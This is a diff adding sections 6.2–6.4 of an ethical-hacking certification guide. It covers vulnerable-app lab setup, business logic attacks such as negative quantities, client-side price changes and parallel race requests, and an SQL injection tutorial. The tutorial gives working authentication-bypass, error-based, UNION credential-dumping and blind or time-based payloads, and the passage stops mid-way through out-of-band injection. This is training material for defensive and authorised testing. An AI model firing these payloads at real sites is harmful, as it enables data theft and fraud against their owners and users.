@@ -14013,3 +14013,1402 @@ The automated layers give you breadth. The manual layer gives you depth. Togethe
 *— Section 6.1 is complete. Sections 6.2 through 6.13 continue in subsequent documents as instructed. —*
 
 ---
+# Module 6 — Sections 6.2, 6.3, and 6.4
+
+> **CompTIA PenTest+ / Ethical Hacking Certification Series**
+> *Professional Reference Guide — GitHub Edition*
+> *Building your own lab · Business Logic · SQL Injection · Command Injection · LDAP Injection*
+
+---
+
+## Table of Contents
+
+- [6.2 How to Build Your Own Web Application Lab](#62-how-to-build-your-own-web-application-lab)
+- [6.3 Understanding Business Logic Flaws](#63-understanding-business-logic-flaws)
+- [6.4 Understanding Injection-Based Vulnerabilities](#64-understanding-injection-based-vulnerabilities)
+  - [6.4.1 Overview — What Injection Really Means](#641-overview--what-injection-really-means)
+  - [6.4.2 SQL Injection Vulnerabilities — The Complete Deep Dive](#642-sql-injection-vulnerabilities--the-complete-deep-dive)
+  - [6.4.3 Practice — SQL Injection Attacks Step by Step](#643-practice--sql-injection-attacks-step-by-step)
+  - [6.4.4 Command Injection Vulnerabilities](#644-command-injection-vulnerabilities)
+  - [6.4.5 Practice — Command Injection Step by Step](#645-practice--command-injection-step-by-step)
+  - [6.4.6 LDAP Injection Vulnerabilities](#646-ldap-injection-vulnerabilities)
+  - [6.4.7 Lab — Injection Attacks](#647-lab--injection-attacks)
+
+---
+
+## 6.2 How to Build Your Own Web Application Lab
+
+### Why a Personal Lab Is Not Optional
+
+Reading about SQL injection is one thing. Watching a tutorial is another. Actually opening a terminal, sending a payload, watching the database respond, adjusting the payload, and extracting data — that is where understanding becomes skill. You cannot develop the intuition needed for real web application testing without repetition in a safe environment.
+
+A personal lab lets you test every technique in this module legally, without risk to real systems, without fear of crossing legal lines, and with the freedom to break things and learn from the failure. The lab is not a luxury — it is the minimum viable environment for serious security learning.
+
+The good news is that a web application security lab is surprisingly inexpensive and fast to set up. The most powerful approach combines a Linux security distribution with intentionally vulnerable applications. Here is everything you need to know to build a lab that will take you from beginner exercises to advanced exploitation practice.
+
+### The Foundation: Choosing Your Operating System
+
+**Kali Linux** is the industry standard for penetration testing. Maintained by Offensive Security (the organization that created OSCP), Kali is a Debian-based distribution that ships with over 600 pre-installed security tools — Burp Suite, nmap, sqlmap, Metasploit, hydra, aircrack-ng, and hundreds more. You do not need to install or configure these tools individually. They are all available from the command line or the applications menu.
+
+Options for running Kali:
+- **Virtual Machine (recommended for beginners):** Download the Kali VM image (VMware or VirtualBox format) from kali.org/get-kali. Import it into VMware Workstation Player (free) or VirtualBox (free). Your host OS (Windows or macOS) remains completely unaffected by anything you do in the VM.
+- **Bare metal install:** Installing Kali directly on a dedicated machine gives maximum performance. Good for a dedicated lab machine but not ideal as a primary workstation.
+- **WSL2 (Windows Subsystem for Linux):** Kali is available in the Microsoft Store. Good for command-line tool access but some tools requiring raw network access have limitations.
+- **Kali Live USB:** Boot from a USB drive with no installation. Leaves no persistent data. Good for temporary use.
+
+**Parrot OS** is a lighter alternative to Kali. It has the same tool set but uses fewer system resources, making it better suited for older hardware or machines with limited RAM.
+
+**BlackArch Linux** is for advanced users — Arch Linux-based with over 2,800 tools available. Steeper learning curve but the most comprehensive tool collection.
+
+For this module, Kali Linux in a VM is the recommended setup. It is what the labs in the certification curriculum assume, and it is what you will encounter in most learning resources.
+
+### Intentionally Vulnerable Applications — Your Practice Targets
+
+An intentionally vulnerable application is one built to contain specific security flaws for educational purposes. These are legal to attack because that is exactly what they are designed for. You deploy them in your local lab and attack them without any legal or ethical concern.
+
+**DVWA — Damn Vulnerable Web Application**
+
+DVWA is the foundational practice target for web application security. Built with PHP and MySQL, it contains a deliberately vulnerable web application with the following vulnerability categories, each configurable to low, medium, or high security level:
+
+- Brute Force
+- Command Injection
+- CSRF
+- File Inclusion
+- File Upload
+- Insecure CAPTCHA
+- SQL Injection
+- SQL Injection (Blind)
+- Weak Session IDs
+- XSS (DOM)
+- XSS (Reflected)
+- XSS (Stored)
+- JavaScript attacks
+
+The security levels (low/medium/high) make DVWA excellent for progressive learning — start at low with no defenses, understand the attack, then move to medium and high to learn how defenses are implemented and how to bypass them. This reinforces both offensive and defensive understanding simultaneously.
+
+Installation on Kali:
+```bash
+# Install DVWA using the official installation script
+sudo apt update
+sudo apt install -y dvwa
+
+# Start the required services
+sudo systemctl start apache2
+sudo systemctl start mysql
+
+# Access DVWA in your browser
+# http://127.0.0.1/dvwa/
+
+# Default credentials: admin / password
+# First visit: http://127.0.0.1/dvwa/setup.php
+# Click "Create / Reset Database"
+```
+
+**WebSploit Labs**
+
+WebSploit Labs is a more modern, comprehensive collection of vulnerable environments maintained by Omar Santos (author of numerous Cisco Press security books and CCNA CyberOps materials). The platform includes hundreds of vulnerable systems and is regularly updated to reflect current vulnerability classes.
+
+Access at: [https://websploit.org](https://websploit.org)
+
+WebSploit Labs runs as Docker containers, making setup straightforward on any system with Docker installed. Many of the lab exercises in the certification curriculum can be completed using WebSploit Labs targets.
+
+**Metasploitable 2 and 3**
+
+Metasploitable is a virtual machine intentionally built with dozens of vulnerabilities at both the network and application layer. Metasploitable 2 is the more widely used version — a Linux VM with a vulnerable web application (Mutillidae), vulnerable network services (FTP, SSH, Telnet, SMB, MySQL, PostgreSQL, VNC, IRC), and deliberately misconfigured services.
+
+Download from Rapid7 or SourceForge. Import into VMware or VirtualBox and configure on a host-only network adapter (never expose Metasploitable to the internet — it will be compromised within minutes).
+
+**HackTheBox (HTB)**
+
+HackTheBox is a cloud-based platform with intentionally vulnerable machines and web challenges. It requires no local infrastructure — you connect via VPN to HTB's lab network. The machines range from easy to insane difficulty and reflect real-world attack scenarios much more closely than DVWA. HTB is where you go after building foundational skills on DVWA — it is the bridge between learning and professional-level practice.
+
+Free tier at: [https://www.hackthebox.com](https://www.hackthebox.com)
+
+**TryHackMe**
+
+TryHackMe is even more beginner-friendly than HTB. It offers guided learning paths with browser-based attack machines that require no VPN setup. The web application security rooms on TryHackMe cover SQL injection, XSS, command injection, file inclusion, and more with step-by-step guidance.
+
+At: [https://tryhackme.com](https://tryhackme.com)
+
+**PortSwigger Web Security Academy**
+
+This deserves special mention. Created by the team behind Burp Suite, the Web Security Academy at [https://portswigger.net/web-security](https://portswigger.net/web-security) provides free interactive labs for every OWASP vulnerability category. These labs run entirely in the browser. The quality is exceptional — they are the closest thing to professional web application security training available for free. If you only use one external resource alongside your local DVWA lab, make it the Web Security Academy.
+
+### Docker-Based Lab Setup — The Modern Approach
+
+Docker containers make lab setup and teardown instant. Instead of managing multiple VMs, you run vulnerable applications as isolated containers that start in seconds and can be destroyed without any cleanup.
+
+```bash
+# Install Docker on Kali
+sudo apt install -y docker.io
+sudo systemctl start docker
+sudo systemctl enable docker
+sudo usermod -aG docker $USER  # Add yourself to docker group
+# Log out and back in for group change to take effect
+
+# Run DVWA as a Docker container
+docker run -d -p 80:80 vulnerables/web-dvwa
+# Access at: http://127.0.0.1/
+
+# Run Mutillidae (comprehensive vulnerable web app)
+docker run -d -p 80:80 webpwnized/mutillidae:2.9.0-LAMP
+
+# Run OWASP Juice Shop (modern Node.js vulnerable app, great for learning)
+docker run -d -p 3000:3000 bkimminich/juice-shop
+# Access at: http://127.0.0.1:3000
+
+# Run WebGoat (OWASP's Java-based vulnerable app)
+docker run -d -p 8080:8080 webgoat/goat-and-wolf
+
+# Run a deliberately vulnerable API (for API testing practice)
+docker run -d -p 5000:5000 erev0s/vampi
+
+# Stop and remove a container when done
+docker ps           # List running containers
+docker stop <container_id>
+docker rm <container_id>
+```
+
+### The Recommended Lab Architecture
+
+Your complete lab should look like this:
+
+**Host Machine (your physical computer):**
+Running VMware Workstation Player or VirtualBox. This hosts your VMs.
+
+**VM 1 — Kali Linux (attack machine):**
+Your primary working environment. All security tools pre-installed. This is where you run Burp Suite, sqlmap, nmap, and everything else.
+
+**VM 2 — Vulnerable Target (or Docker containers):**
+Run DVWA, Metasploitable, or Docker containers here. This is what you attack.
+
+**Network Configuration:**
+Both VMs should be on a Host-Only network adapter. This means:
+- The VMs can communicate with each other
+- The VMs can communicate with the host
+- Neither VM can reach the internet (protecting you from accidentally attacking external systems and protecting Metasploitable from being attacked externally)
+
+```
+VMware/VirtualBox Network Settings:
+- Kali VM: Host-Only Adapter (e.g., 192.168.56.101)
+- Target VM: Host-Only Adapter (e.g., 192.168.56.102)
+- Both VMs can ping each other
+- Neither can access the internet through this adapter
+```
+
+### Burp Suite — Your Primary Web Testing Tool
+
+Burp Suite Community Edition is pre-installed on Kali. Configure it as an intercepting proxy between your browser and your vulnerable application target, and every HTTP request passes through Burp where you can read, modify, and replay it.
+
+Quick setup:
+1. Launch Burp Suite from Kali's applications menu or `burpsuite` in terminal
+2. In Burp: Proxy → Options → confirm listener is `127.0.0.1:8080`
+3. In Firefox on Kali: Settings → Network Settings → Manual Proxy → HTTP Proxy: `127.0.0.1`, Port: `8080`
+4. Navigate to your vulnerable application — all traffic now flows through Burp
+
+Install the FoxyProxy Firefox extension for easy proxy switching between testing and normal browsing.
+
+---
+
+## 6.3 Understanding Business Logic Flaws
+
+### The Vulnerability That Scanners Cannot See
+
+Here is a question to test your understanding: What do all of the following scenarios have in common?
+
+A user on an e-commerce site adds $200 worth of items to their cart, applies a "get 20% off orders over $150" discount code, removes $100 worth of items, and checks out — paying $100 minus the 20% discount, despite their cart being worth far less than $150.
+
+A user on a banking application initiates a funds transfer, but instead of following step 1 → 2 → 3 → confirm, they navigate directly from step 1 to step 3's URL. No verification step. Transfer proceeds.
+
+A user registers for a free 30-day trial, creates an account, cancels, creates a new account with a different email, gets another 30-day trial, and repeats indefinitely.
+
+What these share: none of them involve a coding error in the traditional sense. No SQL query was improperly parameterized. No XSS payload was needed. No buffer was overflowed. The code works exactly as it was written. The flaw is in the **design** — specifically, the business rules that the developer assumed users would follow but that a creative attacker can circumvent.
+
+These are business logic flaws. And they are the most dangerous category of web vulnerability to miss, because automated scanners cannot find them. A scanner can identify that a parameter is not properly sanitized. It cannot know that removing an item from a cart after applying a discount should re-validate the discount threshold, because that requires understanding the business rule being enforced.
+
+### What Business Logic Flaws Are — The Precise Definition
+
+MITRE's Common Weakness Enumeration classifies business logic errors under **CWE-840** with subordinate categories including:
+
+- **CWE-841** — Improper Enforcement of Behavioral Workflow
+- **CWE-438** — Behavioral Change in New Version or Environment
+- **CWE-639** — Authorization Bypass Through User-Controlled Key
+
+OWASP defines a business logic vulnerability as: a flaw in the design or implementation of an application that allows an attacker to elicit unintended behavior from a legitimate feature. The attacker is not using a technical exploit — they are using the application as intended, just in a way the designer did not anticipate.
+
+The key characteristics that distinguish business logic flaws from technical vulnerabilities:
+
+They require understanding the application's **purpose and rules**, not just its technical implementation. A SQL injection payload is the same regardless of what the application does. A business logic attack is entirely specific to that application's specific workflow and rules.
+
+They often involve **correct behavior at each individual step** but incorrect behavior across the sequence. Each step validates correctly. The flaw is in the assumption that steps happen in the expected order or with expected preconditions.
+
+They almost always require **manual testing by a tester who understands the application's purpose**. Automated tools that operate on requests and responses in isolation cannot model multi-step workflows.
+
+### The Business Logic Testing Mindset
+
+Before looking at specific attack patterns, you need to internalize the mindset that finds business logic flaws. When you approach any application feature, ask these questions:
+
+What is this feature supposed to do, and what assumptions does the developer make about how users interact with it?
+
+What happens if I use this feature in an order the developer did not intend — skipping steps, repeating steps, doing step 5 before step 2?
+
+What happens if I provide values at the extreme boundaries of what is logically expected — negative numbers, zero, absurdly large numbers, empty values?
+
+What happens if I complete step 1 as User A and step 2 as User B?
+
+What happens if I do two things simultaneously that are supposed to happen sequentially?
+
+What client-side restrictions are there, and what happens when I remove them?
+
+The PortSwigger Web Security Academy's description is excellent: "Business logic vulnerabilities often arise because the design and development teams make flawed assumptions about how users will interact with the application."
+
+### Category 1 — Workflow Bypasses
+
+Workflow vulnerabilities occur when an application enforces a required sequence of steps in the user interface but does not enforce that same sequence server-side. The UI hides the "next" button until you complete the current step. But the next step's URL is accessible directly, and the server does not check whether the prerequisite step was completed.
+
+**Classic example — Bypassing email verification:**
+
+A registration flow requires:
+1. Register with email and password → account created but inactive
+2. Receive verification email → click link
+3. Account activated → can now log in
+
+If the developer only blocks login based on a `verified` flag in the database, but the verification endpoint at `/verify-email?token=XYZ` can be guessed or brute-forced, or if step 2 can be replaced by directly navigating to the post-verification dashboard, the entire verification step is meaningless.
+
+**Testing approach:**
+
+During any multi-step flow — registration, checkout, password reset, document signing, approval workflows — map every URL and endpoint involved in each step. After completing step 1, attempt to navigate directly to step 3's URL without completing step 2. Observe:
+
+Does the server redirect you back to step 2 (correct behavior — server-side state enforcement)?
+
+Does the server serve step 3's content directly (vulnerable — no server-side sequence enforcement)?
+
+In Burp Suite's Proxy HTTP history, you can see all requests made during a legitimate walkthrough of the flow. Note which endpoints correspond to which steps. Then in Repeater, replay step 3's request without first completing step 2.
+
+**Real-world case — 2FA bypass:**
+
+A login flow with two-factor authentication:
+1. Submit username and password → server validates credentials → redirects to MFA page
+2. Submit MFA code → server validates → grants session
+
+If after step 1 the server sets a session that indicates "credentials validated, awaiting MFA" but the user can navigate directly to the post-login dashboard URL and the server grants access based only on the first-factor session — the MFA step is bypassed entirely. This has been found in production applications and is documented in the PortSwigger Web Security Academy's business logic labs.
+
+### Category 2 — Price Manipulation and E-Commerce Logic Flaws
+
+The financial consequences of e-commerce business logic flaws are often immediate and quantifiable. These vulnerabilities are particularly common because financial systems are complex, involve many interacting components (cart, pricing engine, discount system, inventory), and are often built by teams under deadline pressure.
+
+**Discount threshold manipulation:**
+
+The classic example: "10% off orders over $100." Implementation:
+
+1. Add items until cart total exceeds $100
+2. Apply discount code — system validates cart > $100, applies 10% discount
+3. Remove items from cart, reducing total to $30
+4. Checkout — if the system does not re-validate the discount condition at checkout, you receive 10% off a $30 cart
+
+The correct implementation re-validates all discount conditions at the final checkout step, not just at the point of application. The vulnerable implementation only validates at application time and trusts the stored discount state thereafter.
+
+**Testing approach:**
+
+In Burp, intercept the request at each step of the checkout flow. Specifically after applying a discount, modify the cart contents and monitor whether the discount is recalculated or retained. Send the final checkout request with values that contradict the applied discount conditions and observe whether the server re-validates.
+
+**Negative quantity:**
+
+An application that accepts quantity as a user-submitted value without proper server-side validation may accept negative quantities. A shopping cart with -1 units of a $100 item might calculate a total of -$100, which when combined with actual positive purchases could reduce the total to near-zero or even result in a credit.
+
+```
+# Normal request
+POST /cart/update
+item_id=789&quantity=1
+
+# Manipulated request (intercept in Burp and modify)
+POST /cart/update
+item_id=789&quantity=-1
+```
+
+The fix is always the same: validate quantity as a positive integer server-side. Never trust client-submitted numeric values without range validation.
+
+**Client-side price manipulation:**
+
+Some applications send item prices from the client during add-to-cart operations rather than looking them up server-side. The client submits the price to pay, and the server trusts it.
+
+```
+# Normal add-to-cart request
+POST /cart/add
+item_id=456&price=99.99&quantity=1
+
+# Manipulated request (Burp Intercept → modify price field)
+POST /cart/add
+item_id=456&price=0.01&quantity=1
+```
+
+If the server uses the client-submitted price rather than looking up the price from its own database, this results in purchasing at the attacker-specified price. This type of flaw is shockingly common in poorly implemented e-commerce applications.
+
+**The golden rule this violates:** Never trust any value from the client for financial calculations. Always look up prices server-side from a trusted data source at the time of purchase calculation.
+
+### Category 3 — Race Conditions
+
+Race conditions are among the most technically interesting business logic vulnerabilities. They exploit the timing gap between when the application reads a state, makes a decision based on that state, and writes back the updated state.
+
+The vulnerability arises when:
+1. Application reads state ("Is this coupon code still valid? Has it been used?")
+2. Application determines it is valid and proceeds
+3. Application uses the coupon and marks it as used
+
+Between steps 2 and 3, if another identical request arrives simultaneously, that second request also reads the state before step 3 has updated it. Both requests see the coupon as unused. Both requests proceed. One coupon is redeemed twice.
+
+**The PortSwigger example (documented in their Web Security Academy):**
+A gift card system allows single-use redemption. An attacker writes a script that sends 50 simultaneous redemption requests for the same gift card code. For each request, before any of them complete and update the "redeemed" flag, the check returns "not yet redeemed." All 50 requests proceed. The balance is applied 50 times.
+
+Burp Suite has built-in support for testing race conditions through its "Send group in parallel" feature in Repeater. This sends multiple requests simultaneously, maximizing the overlap in timing.
+
+```
+In Burp Suite Repeater:
+1. Create your single redemption request
+2. Right-click → "Send to Repeater" 20 times
+3. Select all tabs
+4. Right-click → "Send group in parallel (last-byte sync)"
+5. All 20 requests fire simultaneously
+6. Observe how many succeed
+```
+
+Documented real examples: the CVE-2024-58248 (gift card double-spending via race condition), numerous cryptocurrency exchange double-spend vulnerabilities, banking application balance manipulation.
+
+**Defenses against race conditions:**
+Database-level locking (SELECT FOR UPDATE, atomic operations, transactions with isolation level SERIALIZABLE), Redis-based distributed locks, or comparing-and-swapping state values atomically. Idempotency keys for financial operations ensure the same operation cannot be processed twice regardless of timing.
+
+### Category 4 — Unverified Ownership
+
+Applications sometimes allow operations on objects based on a user-supplied identifier without verifying that the authenticated user is the owner of that object. This overlaps with IDOR (covered in OWASP A01) but specifically in business workflow contexts.
+
+Example: A multi-step order modification flow. In step 1, the user selects their order number. In step 2, they make modifications. In step 3, they confirm. The application tracks the selected order in the session. But what if in step 2, the attacker changes the order number in the request to another user's order number? Does the server verify ownership at each step?
+
+### Category 5 — Account and Resource Limit Bypasses
+
+**Trial period abuse:**
+Applications offering free trials that create new accounts can be abused if the only enforcement is at the account level and creating new accounts (with different emails) is unrestricted. The fix requires binding trials to payment methods, device fingerprints, or IP ranges with proper rate limiting.
+
+**Quantity limit bypass:**
+"Limit 3 per customer" promotions enforced by checking the existing order count before placing a new order. Race condition allows bypassing the check by sending multiple simultaneous order requests. Each request checks the count (still 0, 1, 2) before any updates. Multiple orders at the promotional price succeed.
+
+**Password recovery abuse:**
+Weak recovery mechanisms (4-digit numeric SMS codes, security questions with predictable answers, recovery flows that do not rate-limit attempts) enable account takeover through brute force or prediction. OWASP specifically lists "Weak password recovery mechanism for forgotten password" under CWE-640 as a business logic flaw.
+
+### How to Test for Business Logic Flaws — The Professional Methodology
+
+Since automated tools cannot find business logic flaws, the methodology is entirely manual and requires deep application understanding.
+
+**Step 1: Map the application thoroughly**
+Use Burp Suite's spider, browse every page, and understand what the application does from a business perspective. What can users buy, transfer, subscribe to, approve, reject, upload, share? What are the business rules?
+
+**Step 2: Identify critical workflows**
+Focus on flows involving money, access control, authentication state changes, quota enforcement, or competitive advantage. These are where business logic errors have the highest impact.
+
+**Step 3: For each workflow, attempt:**
+- **Step skipping:** Navigate directly to later steps without completing earlier ones
+- **Step repetition:** Complete the same step multiple times and observe state
+- **Step reversal:** Complete the flow, then go back and modify earlier steps
+- **Simultaneous requests:** Send critical steps simultaneously via Burp's parallel send feature
+- **Parameter manipulation:** Modify quantities to negative, zero, or extreme values; modify prices, IDs, status fields
+- **Cross-user testing:** Complete step 1 as User A, step 2 as User B; observe whether User A's data is accessible to User B
+
+**Step 4: Ask "what would a fraudster do?"**
+Approach with the mindset of someone trying to get something for free, circumvent authorization, or manipulate the system. This mindset is more productive for business logic testing than the technical exploitation mindset used for SQL injection.
+
+**Step 5: Document everything**
+Business logic findings require more extensive documentation than technical vulnerabilities because you must explain the business impact, which is often complex. Show the exact sequence of steps, the request at each step, and the resulting anomalous outcome.
+
+---
+
+## 6.4 Understanding Injection-Based Vulnerabilities
+
+### 6.4.1 Overview — What Injection Really Means
+
+Every injection vulnerability, regardless of what is being injected into, shares the same fundamental cause: **the application fails to distinguish between the instructions (code) and the data being processed by those instructions**. User-supplied data enters a context where it is interpreted as code by some interpreter — a database engine, an operating system shell, an LDAP server, a template processor, an XML parser.
+
+Think about what "injection" means in the everyday physical world. A doctor injects medicine into a patient because intravenous injection gets material directly into the bloodstream — bypassing the normal barriers. SQL injection is the same principle: an attacker injects their commands directly into the database query, bypassing the application layer that was supposed to mediate all database interactions.
+
+The root cause is always the same: **the application builds executable commands by concatenating strings that include user-controlled values**. The fix is always the same: **separate the code from the data using parameterized queries, prepared statements, or context-appropriate encoding**. Never concatenate user input into executable commands.
+
+Different interpreters that can be injected into:
+
+| Interpreter | Injection Type | What Gets Executed |
+|-------------|---------------|-------------------|
+| SQL database | SQL Injection | SQL queries |
+| Operating system | Command Injection | Shell commands |
+| LDAP server | LDAP Injection | LDAP filter queries |
+| XML parser | XXE Injection | XML external entity declarations |
+| Browser DOM | XSS | JavaScript |
+| Template engine | SSTI | Template expressions |
+| XPath | XPath Injection | XPath queries |
+| NoSQL database | NoSQL Injection | MongoDB/Cassandra operators |
+| Email headers | Header Injection | Email routing instructions |
+
+Each injection type differs in syntax, context, and exploitation technique, but the underlying logic is identical. Learn the pattern, not just the specific payloads.
+
+---
+
+### 6.4.2 SQL Injection Vulnerabilities — The Complete Deep Dive
+
+#### Understanding SQL First — The Language of the Target
+
+To exploit SQL injection you must understand the SQL that is being manipulated. SQL (Structured Query Language) is the language used to interact with relational databases — MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite. Every web application that stores data in a relational database uses SQL to read and write that data.
+
+The four fundamental SQL operations:
+
+```sql
+-- SELECT: Read data from a table
+SELECT username, email FROM users WHERE id = 42;
+
+-- INSERT: Add new rows to a table
+INSERT INTO orders (user_id, total, status) VALUES (42, 99.99, 'pending');
+
+-- UPDATE: Modify existing rows
+UPDATE users SET password = 'newHash' WHERE id = 42;
+
+-- DELETE: Remove rows
+DELETE FROM sessions WHERE expires_at < NOW();
+```
+
+When a web application needs to look up a user after login, the code might build a query like this:
+
+```php
+// PHP example (vulnerable code)
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($connection, $query);
+```
+
+If legitimate values are submitted — username: `alice`, password: `MyPassword123` — the resulting query is:
+
+```sql
+SELECT * FROM users WHERE username = 'alice' AND password = 'MyPassword123'
+```
+
+This works as intended. But what does SQL do with special characters? What happens when the input is not a simple string?
+
+#### Why the Single Quote Is the Most Important Character in SQL Injection
+
+In SQL, single quotes (`'`) delimit string values. When the database parser encounters a single quote inside a query, it interprets the quote as the end of the string value. Everything after that point is interpreted as SQL syntax, not as a string.
+
+If the attacker enters `admin'--` as the username:
+
+```sql
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
+```
+
+The `'` after `admin` closes the string. The `--` is SQL's comment syntax — everything after it is a comment, effectively deleting the rest of the query. The query that actually executes is:
+
+```sql
+SELECT * FROM users WHERE username = 'admin'
+```
+
+No password check. If a user named `admin` exists, the query returns their record and the application logs in the attacker as admin. This is authentication bypass through SQL injection, and it requires no knowledge of the password.
+
+#### The SQL Injection Classification System
+
+SQL injection is categorized by two dimensions: what happens to the data extracted, and whether the results are visible in the response.
+
+**In-Band SQL Injection:**
+The attack and data extraction happen through the same channel (the HTTP request/response). Results are visible directly in the response body.
+
+**Inferential (Blind) SQL Injection:**
+The results are not visible in the response, but the attacker infers information by observing how the application behaves differently for true versus false conditions.
+
+**Out-of-Band SQL Injection:**
+Data is extracted through a completely different channel — typically DNS queries or HTTP requests made by the database server to an attacker-controlled endpoint.
+
+#### Error-Based SQL Injection — Reading Data from Error Messages
+
+Error-based injection extracts database information directly from error messages. When the database encounters a malformed query, it often reports what went wrong in an error message — and these error messages frequently contain database version information, table names, or even query results.
+
+```sql
+-- Payload causing a MySQL error that reveals database version:
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
+
+-- Error message returned:
+-- XPATH syntax error: '~5.7.43-0ubuntu0.18.04.1'
+--                      ^^^ Database version revealed in the error
+```
+
+```sql
+-- Payload revealing current database name:
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--
+
+-- Error: XPATH syntax error: '~webshop_prod'
+```
+
+Error-based injection is the fastest way to extract data when error messages are visible, because each payload returns data directly in the error string. The limitation: modern production applications suppress error messages, making error-based injection impossible against well-configured servers.
+
+**Database-specific error-based payloads:**
+
+MySQL uses `EXTRACTVALUE()` or `UPDATEXML()`. Microsoft SQL Server uses `CONVERT()` with incompatible type conversions. Oracle uses column type mismatch in `UNION` operations. PostgreSQL uses `CAST()` with invalid conversions. Each database engine exposes data differently through its error messages.
+
+#### UNION-Based SQL Injection — The Data Extraction Workhorse
+
+UNION-based injection is the most powerful form of in-band SQL injection when results are visible in the response. It works by appending an additional `SELECT` statement to the original query using the SQL `UNION` operator, merging attacker-controlled query results with the application's legitimate results.
+
+**The requirement:** A UNION query only works when the injected SELECT has the same number of columns as the original SELECT, and compatible data types. Your first task is always to determine the column count of the original query.
+
+**Step 1: Determine the column count using ORDER BY**
+
+```sql
+-- The original (vulnerable) query:
+SELECT product_name, price, description FROM products WHERE category = 'phones'
+
+-- Your injected value in the category parameter:
+phones' ORDER BY 1--     -- succeeds: at least 1 column
+phones' ORDER BY 2--     -- succeeds: at least 2 columns
+phones' ORDER BY 3--     -- succeeds: at least 3 columns
+phones' ORDER BY 4--     -- ERROR: "Unknown column '4' in order clause"
+-- Conclusion: the query has exactly 3 columns
+```
+
+**Step 2: Find which columns are displayed in the response**
+
+Not every column in a SELECT is necessarily displayed on the page. Your injected data must go into a column that is rendered in the response.
+
+```sql
+-- Test which columns display string data (use NULL for compatible typing):
+phones' UNION SELECT 'test1', NULL, NULL--
+phones' UNION SELECT NULL, 'test2', NULL--
+phones' UNION SELECT NULL, NULL, 'test3'--
+
+-- When 'test2' appears on the page, you know column 2 is displayed
+```
+
+**Step 3: Extract data**
+
+With column count known and a display column identified, extract any data:
+
+```sql
+-- Extract database version:
+phones' UNION SELECT NULL, version(), NULL--
+
+-- Extract all tables in the current database:
+phones' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- Extract column names from the users table:
+phones' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- Extract usernames and passwords:
+phones' UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users--
+
+-- If only one column is visible, concatenate multiple values:
+phones' UNION SELECT NULL, CONCAT(username, 0x7c, password, 0x7c, email), NULL FROM users--
+-- 0x7c is hex for | — used as separator
+```
+
+The `information_schema` is a meta-database that every MySQL/MariaDB installation contains. It stores information about all other databases, tables, and columns. Querying `information_schema` is how attackers map the entire database structure without knowing anything about it in advance.
+
+**Complete data extraction sequence:**
+
+```sql
+-- 1. Find all databases:
+' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata--
+
+-- 2. Find all tables in target database 'webshop':
+' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='webshop'--
+
+-- 3. Find all columns in 'users' table:
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' AND table_schema='webshop'--
+
+-- 4. Extract the data:
+' UNION SELECT NULL, CONCAT(id,'|',username,'|',password,'|',email), NULL FROM users LIMIT 10--
+```
+
+#### Boolean-Based Blind SQL Injection — Inferring Data One Bit at a Time
+
+Blind SQL injection is used when the application is vulnerable to injection but does not return query results or error messages. Instead, the application's behavior changes based on whether an injected condition is true or false — perhaps the page loads normally for true conditions and shows an error page or empty results for false conditions.
+
+You cannot extract data directly. But you can ask yes/no questions and infer data from the answers.
+
+**The concept:**
+
+```sql
+-- Original vulnerable query:
+SELECT * FROM products WHERE id = [USER_INPUT]
+
+-- Test: is the first character of the current database name 'a'?
+1 AND SUBSTRING(database(), 1, 1) = 'a'
+
+-- If the page loads normally: the database name starts with 'a' (true)
+-- If the page shows an error or empty: false, try 'b', 'c', etc.
+```
+
+This is extraordinarily slow manually — determining even a single character requires up to 26 attempts (or 128 for all ASCII characters). Tools like sqlmap automate this completely, but understanding the manual process is essential for certification exams and for debugging when automated tools behave unexpectedly.
+
+**Systematic character extraction:**
+
+```sql
+-- Check database name length:
+1 AND LENGTH(database()) = 6       -- is the database name 6 characters? True/False
+
+-- Check first character:
+1 AND ORD(SUBSTRING(database(), 1, 1)) > 77    -- is ASCII value > 77? (binary search faster than linear)
+1 AND ORD(SUBSTRING(database(), 1, 1)) > 100   -- narrow down range
+1 AND ORD(SUBSTRING(database(), 1, 1)) = 119   -- ASCII 119 = 'w'
+
+-- Check second character:
+1 AND ORD(SUBSTRING(database(), 2, 1)) = 101   -- ASCII 101 = 'e'
+
+-- Character by character: 'w' + 'e' + ... = 'webshop'
+```
+
+Binary search reduces the number of requests from 128 per character to about 7. For a 10-character database name: 70 requests instead of 1280.
+
+#### Time-Based Blind SQL Injection — When Nothing Is Visible at All
+
+Time-based injection is used when the application produces identical responses regardless of whether the injected condition is true or false — even error messages are suppressed. The only channel remaining is time.
+
+By injecting a conditional time delay, the attacker can observe whether a condition is true (delay occurs) or false (no delay). The information is encoded in the response time.
+
+```sql
+-- MySQL: Is the first character of the database name 'w'?
+1 AND IF(SUBSTRING(database(), 1, 1) = 'w', SLEEP(5), 0)--
+
+-- If the response takes 5+ seconds to arrive: the first character is 'w' (true)
+-- If the response arrives immediately: false, try next character
+```
+
+**Database-specific sleep functions:**
+```sql
+-- MySQL / MariaDB
+SLEEP(5)                        -- pause 5 seconds
+
+-- Microsoft SQL Server
+WAITFOR DELAY '0:0:5'          -- pause 5 seconds
+
+-- Oracle
+dbms_pipe.receive_message(('a'),5)  -- pause 5 seconds (requires privileges)
+-- or: execute 'begin DBMS_LOCK.sleep(5); end;'
+
+-- PostgreSQL
+pg_sleep(5)                    -- pause 5 seconds
+SELECT 1 FROM pg_sleep(5)
+```
+
+Time-based injection is the slowest and most unreliable method — network latency affects timing, server load can cause natural delays, and extracting even a single table name requires hundreds of requests. But it is often the only option against hardened applications that suppress all output. This is where sqlmap's time-based blind mode becomes essential.
+
+#### Out-of-Band SQL Injection — Using DNS as a Data Channel
+
+Out-of-band injection uses the database server's ability to make outbound network connections to exfiltrate data. Instead of reading data from the HTTP response, the database server sends data to an attacker-controlled DNS resolver or HTTP server.
+
+This is particularly useful when:
+- The application does not display query results (like blind)
+- Time-based methods are unreliable due to network conditions
